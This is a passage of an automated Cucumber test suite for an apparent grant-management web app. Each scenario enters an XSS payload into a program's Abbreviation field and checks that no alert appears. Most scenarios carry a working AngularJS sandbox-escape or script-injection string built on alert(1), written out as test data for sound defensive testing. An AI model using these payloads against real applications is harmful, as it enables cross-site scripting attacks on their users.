  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                            | Field                |
      | {{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301552 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                  | Field                |
      | {{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301554 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                             | Field                |
      | {{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301555 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                      | Field                |
      | {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301557 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                           | Field                |
      | {{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301559 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value              | Field                |
      | {testData:script2} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301563 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                                                                                                                                                                  | Field                |
      | {{c=''.sub.call;b=''.sub.bind;c.$apply=$apply;c.$eval=b;$root.$$phase=null;$root.$digest=$on; C=c.$apply(c);B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='alert(1)';astNode.argument={type:'Identifier'};");m1=$$asyncQueue.pop().expression;m2=B(C,null,m1);[].push.apply=m2;$eval('B(b)');}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301564 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                     | Field                |
      | {{constructor.constructor('alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301565 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                              | Field                |
      | {{$on.constructor('alert(1)')()}}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301566 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                 | Field                |
      | constructor.constructor('alert(1)')() | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301567 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                  | Field                |
      | a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')() | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301568 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                   | Field                |
      | toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor) | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301569 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                                                                                                                                                         | Field                |
      | {}[['__proto__']]['x']=constructor.getOwnPropertyDescriptor;g={}[['__proto__']]['x'];{}[['__proto__']]['y']=g(''.sub[['__proto__']],'constructor');{}[['__proto__']]['z']=constructor.defineProperty;d={}[['__proto__']]['z'];d(''.sub[['__proto__']],'constructor',{value:false});{}[['__proto__']]['y'].value('alert(1)')() | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301570 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                | Field                |
      | {}.")));alert(1)//"; | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301572 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value              | Field                |
      | {testData:script3} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301575 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value              | Field                |
      | {testData:script4} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301576 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                 | Field                |
      | constructor.constructor('alert(1)')() | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301577 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
